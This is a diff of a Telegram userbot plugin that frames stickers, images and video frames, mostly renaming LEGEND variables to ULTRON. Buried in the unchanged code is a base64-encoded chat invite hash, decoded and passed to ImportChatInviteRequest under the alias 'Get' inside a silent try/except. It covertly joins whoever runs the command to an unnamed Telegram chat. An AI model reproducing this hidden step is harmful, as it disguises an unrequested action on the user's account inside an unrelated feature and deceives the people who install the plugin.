-    LEGENDid = LEGEND.reply_to_msg_id
+    ULTRONid = ULTRON.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    ULTRONsticker = await reply.download_media(file="./temp/")
+    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(ULTRONsticker)
+        await edit_or_reply(ULTRON, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if ULTRONsticker.endswith(".tgs"):
+        await ULTRON.edit(
             "Analyzing this media 🧐 framing this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        ULTRONfile = os.path.join("./temp/", "meme.png")
+        ULTRONcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith(".webp"):
+        await ULTRON.edit(
             "Analyzing this media 🧐 framing this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(ULTRONsticker, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif ULTRONsticker.endswith((".mp4", ".mov")):
+        await ULTRON.edit(
             "Analyzing this media 🧐 framing this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        ULTRONfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
+        if not os.path.lexists(ULTRONfile):
+            await ULTRON.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = ULTRONfile
     else:
-        await LEGEND.edit(
+        await ULTRON.edit(
             "Analyzing this media 🧐 framing this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = ULTRONsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await ULTRON.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "framed.webp" if legend else "framed.jpg"
     try:
-        await add_frame(meme_file, outputfile, LEGENDinput, colr)
+        await add_frame(meme_file, outputfile, ULTRONinput, colr)
     except Exception as e:
-        return await LEGEND.edit(f"`{e}`")
+        return await ULTRON.edit(f"`{e}`")
     try:
-        await LEGEND.client.send_file(
-            LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+        await ULTRON.client.send_file(
+            ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
         )
     except Exception as e:
-        return await LEGEND.edit(f"`{e}`")
-    await LEGEND.delete()
+        return await ULTRON.edit(f"`{e}`")
+    await ULTRON.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (ULTRONsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
